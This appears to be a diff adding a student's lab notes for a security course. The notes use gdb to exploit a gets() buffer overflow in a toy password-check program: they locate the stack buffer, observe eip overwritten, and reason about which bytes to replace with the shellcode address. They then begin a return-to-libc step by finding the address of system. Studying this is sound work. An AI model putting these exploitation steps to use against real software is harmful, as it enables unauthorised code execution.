@@ -1,0 +1,54 @@
+Part 1: Code Inject
+
+The shell code is appended in the end of this template. This shell code will run “ps” program to print the running processes.
+To complete this exploit, the start address of the shell code should be used to overflow the return address.
+Since the shell code will be injected on the stack, figuring out the address of “Password” on the stack is the key to solve this problem.
+
+Steps:
+
+set a break point at IsPasswordOkay then run until break and print Password address and examine registers
+
+(gdb) b IsPasswordOkay
+    Breakpoint 1 at 0x8048471: file example01.c, line 7.
+
+(gdb) r
+    Starting program: /home/duluoz/Desktop/srich009/cs260/lab260/l1/example01
+    Enter password:
+
+    Breakpoint 1, IsPasswordOkay () at example01.c:7
+    7	  gets(Password);
+
+(gdb) display &Password
+    &Password = (char (*)[12]) 0xffffd054
+
+(gdb) info registers
+    ...
+    esp            0xffffd050
+    ebp            0xffffd068
+    ...
+    eip            0x8048471
+    ...
+
+the address of the array &Password is probably at ebp-0x14
+
+trying to run with the shell code
+
+(gdb) r < injex.bin
+    Starting program: /home/duluoz/Desktop/srich009/cs260/lab260/l1/example01 < injex.bin
+    Enter password:
+
+    Program received signal SIGSEGV, Segmentation fault.
+    0x31313131 in ?? ()
+
+in the shell code might change the series of 31 31 31 31 31 31 31 31 to address of Password?
+first 4 bytes changes ebp
+last 4 bytes changes eip
+
+
+----------------------------------------
+
+Part 2: Return to libc
+
+(gdb) display &system
+&system = (<text variable, no debug info> *) 0xf7e2cda0 <system>
+
